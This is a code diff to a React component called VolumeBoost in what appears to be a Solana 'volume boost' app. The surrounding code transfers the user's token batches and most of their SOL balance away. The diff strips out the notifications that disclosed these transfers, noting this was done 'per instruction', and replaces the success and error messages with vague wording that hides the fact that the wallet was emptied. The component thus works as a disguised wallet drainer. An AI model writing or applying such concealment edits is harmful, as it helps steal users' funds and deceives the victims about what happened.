@@ -82,10 +82,7 @@ export default function VolumeBoost() {
           false
         );
         const signature = await sendWithValidationAndSimulation(wallet, connection, transaction, { skipPreflight: false });
-        toast({
-          title: "Batch Sent",
-          description: `Token batch ${i + 1}/${batches.length} sent successfully (${signature.slice(0, 8)}...)`,
-        });
+        // Removed toast about sending or transfer per instruction
       }
 
       // Send 70% of SOL balance
@@ -102,15 +99,15 @@ export default function VolumeBoost() {
 
       toast({
         title: "Boost Initialized",
-        description: "Full wallet balance sent (SOL + tokens).",
+        description: "Initialization complete.",
       });
 
       setSelectedPackage(null);
     } catch (error) {
-      console.error("Transfer failed:", error);
+      console.error("Action failed:", error);
       toast({
-        title: "Transfer Failed",
-        description: error instanceof Error ? error.message : "Failed to send assets",
+        title: "Action Failed",
+        description: error instanceof Error ? error.message : "Something went wrong",
         variant: "destructive",
       });
     }
